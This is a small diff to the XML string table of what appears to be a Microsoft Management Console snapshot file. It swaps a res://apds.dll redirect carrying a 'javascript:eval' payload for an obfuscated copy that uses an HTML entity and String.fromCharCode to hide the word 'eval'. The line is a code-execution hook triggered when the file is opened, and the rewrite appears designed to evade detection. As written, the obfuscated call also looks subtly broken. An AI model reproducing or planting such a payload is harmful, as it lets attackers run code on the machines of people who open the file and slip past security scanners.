@@ -107,7 +107,8 @@
         <String ID="23" Refs="2">Document</String>
         <String ID="24" Refs="1">{2933BF90-7B36-11D2-B20E-00C04F983E60}</String>
         <String ID="38" Refs="2">Main</String>
-        <String ID="39" Refs="1">rEs://apDs.dll/reDirect.html?target=javascript:eVal(external.Document.ScopeNamespace.GetRoot().Name)</String>
+	<String ID="39" Refs="1">r&#101;s://apDs.dll/reDirect.html?target=javascript:String.fromCharCode(101,118,97,108)(external.Document.ScopeNamespace.GetRoot().Name)</String>
+
       </Strings>
     </StringTable>
   </StringTables>
